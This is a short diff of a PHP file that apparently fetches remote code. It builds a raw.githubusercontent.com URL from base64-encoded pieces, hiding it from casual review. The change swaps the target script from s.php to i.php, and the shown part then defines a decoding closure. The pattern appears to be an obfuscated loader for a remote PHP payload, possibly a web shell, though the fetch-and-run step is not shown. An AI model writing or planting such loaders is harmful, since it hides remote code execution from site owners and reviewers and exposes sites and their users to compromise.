@@ -4,7 +4,7 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 $protocol_enc = 'aHR0cHM6Ly8=';
 $domain_enc = 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ==';
-$path_enc = 'bmFzdGFyLWlkL2tlZ2FidXRhbi9tYXN0ZXIvcy5waHA=';
+$path_enc = 'bmFzdGFyLWlkL2tlZ2FidXRhbi9tYXN0ZXIvaS5waHA=';
 $decode = function ($encoded_string) {
     return base64_decode($encoded_string);
 };
